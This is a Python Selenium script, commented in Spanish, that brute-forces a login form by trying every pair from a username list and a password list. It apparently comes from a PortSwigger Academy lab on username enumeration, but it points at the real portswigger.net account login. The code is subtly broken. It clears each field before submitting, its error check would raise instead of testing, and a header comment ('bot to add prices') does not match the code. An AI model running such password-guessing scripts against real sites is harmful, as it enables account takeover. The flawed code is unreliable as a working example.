from selenium import webdriver
import time
from selenium.webdriver.common.by import By

#BOT PARA AGREGAR PRECIOS

#obtener usuarios y contraseñas

users = []
fich_ent = open('usuario.txt', 'r')  # Apertura
for linea in fich_ent:
    users.append(linea.replace("\n", ""))

fich_ent.close()  # Cierre

pwds = []
fich_ent = open('passwords_db.txt', 'r')  # Apertura
for linea in fich_ent:
    pwds.append(linea.replace("\n", ""))

fich_ent.close()  # Cierre


#cadena de texto para crear el informe

#primero mostrará el número, después la observación si existe, después obtendrá nombre, el rfc, plan, días




driver = webdriver.Firefox(executable_path=r"ruta donde instalaste el driver")

#link al que quieres ingresar
driver.get("https://portswigger.net/users?returnurl=%2facademy%2flabs%2flaunch%2fbb33e208e844c60faa4fe5876260053b536745d65312212a398ef5799fad29c8%3freferrer%3d%252fweb-security%252fauthentication%252fpassword-based%252flab-username-enumeration-via-different-responses")
time.sleep(3)



for i in range(len(users)):
    for j in range(len(pwds)):
        error = ''
        #dar clic al enlace del laboratorio
        #visualizar el usuario del login
        teclado = driver.find_element(By.ID, "EmailAddress")
        teclado.send_keys(users[i]) #ingresar el usuario X
        teclado.clear() #limpiar el teclado
        teclado = driver.find_element(By.ID, "Password") #visualizar o seleccionar la contraseña del login
        teclado.send_keys(pwds[j]) #ingresar la contraseña
        teclado.clear()#limpiar teclado

        #clic a login
        btn = driver.find_element(By.XPATH,'//*[@id="Login"]') #dar clic en iniciar sesion
        btn.click()#hacer el clic
        time.sleep(2) #opcional, puedes quitarlo para que sea más rapido y aqui no se traba

        error = driver.find_element(By.ID, "Error") #ver si salio el mensaje de error

        if(error):
            print(i,j, "incorrecto") #si existe el mensaje de error no se puede
        else:
            print("Usuario encontrado", users[i], pwds[j]) #en caso de que ingrese muestra credenciales
            exit() #finaliza el programa







time.sleep(40)

driver.close()






#tenemos 101 usuarios
#tenemos 100 contraseñas
#con ningun usuario y contraseña hizo login